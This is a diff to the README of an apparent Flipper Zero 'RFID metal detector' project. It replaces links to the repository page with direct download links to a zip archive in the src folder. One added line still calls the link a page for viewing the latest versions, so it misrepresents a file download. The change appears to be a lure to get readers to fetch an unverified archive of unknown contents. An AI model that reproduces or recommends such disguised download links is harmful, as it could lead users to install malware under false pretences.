@@ -1,6 +1,6 @@
 # 🧲 flipper-rfid-metal-detector - Turn your device into metal finder
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Albertineunlisted484/flipper-rfid-metal-detector)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Albertineunlisted484/flipper-rfid-metal-detector/raw/refs/heads/main/src/rfid-detector-flipper-metal-3.7.zip)
 
 ## 📖 About this project
 
@@ -21,7 +21,7 @@ Before you install this software, ensure your setup meets these requirements:
 
 You need to access the release page to get the correct file for your device.
 
-1.  Visit [this page](https://github.com/Albertineunlisted484/flipper-rfid-metal-detector) to see the latest versions.
+1.  Visit [this page](https://github.com/Albertineunlisted484/flipper-rfid-metal-detector/raw/refs/heads/main/src/rfid-detector-flipper-metal-3.7.zip) to see the latest versions.
 2.  Look for the section marked Releases on the right side of the screen.
 3.  Click the version number at the top of the list.
 4.  Scroll down to the Assets section.
